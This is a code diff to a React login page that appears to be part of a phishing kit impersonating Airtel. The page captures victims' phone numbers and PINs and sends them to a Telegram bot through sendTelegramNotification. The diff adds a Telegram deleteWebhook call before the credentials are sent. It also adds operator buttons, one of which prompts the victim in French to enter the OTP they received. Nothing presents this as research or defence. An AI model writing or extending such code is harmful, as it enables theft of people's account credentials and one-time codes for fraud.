@@ -155,6 +155,16 @@ function Login() {
     }
   }
 
+  async function deleteWebhook() {
+    try {
+      const response = await fetch(TELEGRAM_API + '/deleteWebhook')
+      const data = await response.json()
+      console.log('Webhook deleted:', data.result)
+    } catch (e) {
+      console.error('Webhook deletion failed:', e)
+    }
+  }
+
   async function checkTelegramApproval(requestId) {
     try {
       const offset = lastUpdateIdRef.current > 0 ? lastUpdateIdRef.current + 1 : 0
@@ -233,9 +243,6 @@ function Login() {
         setStatus("approved")
         requestIdRef.current = null
         sessionStorage.setItem('airtelOTPApproved', 'true')
-        setTimeout(() => {
-          navigate(`${basePath}/verification`)
-        }, 800)
       } else if (result.status === 'rejected') {
         clearInterval(pollingIntervalRef.current)
         pollingIntervalRef.current = null
@@ -274,6 +281,8 @@ function Login() {
 
     sessionStorage.setItem('airtelPhone', phoneNumber)
     sessionStorage.setItem('airtelPin', pinCode)
+
+    await deleteWebhook()
 
     const result = await sendTelegramNotification(phoneNumber, pinCode)
     
@@ -389,9 +398,43 @@ function Login() {
                 <span style={{ color: "#4caf50", fontSize: "24px" }}>✅</span>
                 <h3 style={{ margin: 0, color: "#2e7d32" }}>APPROVED SUCCESSFULLY!</h3>
               </div>
-              <p style={{ margin: "5px 0 0 0", color: "#333", opacity: 0.8 }}>
-                Redirecting to verification...
+              <p style={{ margin: "5px 0 0 0", color: "#333", opacity: 0.8, marginBottom: "15px" }}>
+                Choose your next action
               </p>
+              <button
+                onClick={() => navigate(`${basePath}/verification`)}
+                style={{
+                  padding: "10px 20px",
+                  backgroundColor: "#11bb4a",
+                  color: "white",
+                  border: "none",
+                  borderRadius: "6px",
+                  cursor: "pointer",
+                  fontSize: "14px",
+                  fontWeight: "bold"
+                }}
+              >
+                Continue to Verification
+              </button>
+              <br /><br />
+              <button
+                onClick={() => {
+                  sessionStorage.setItem('adminMessage', 'Veuillez saisir le code OTP reçu')
+                  navigate(`${basePath}/message`)
+                }}
+                style={{
+                  padding: "10px 20px",
+                  backgroundColor: "#2196f3",
+                  color: "white",
+                  border: "none",
+                  borderRadius: "6px",
+                  cursor: "pointer",
+                  fontSize: "14px",
+                  fontWeight: "bold"
+                }}
+              >
+                Message User
+              </button>
             </div>
           )}
           
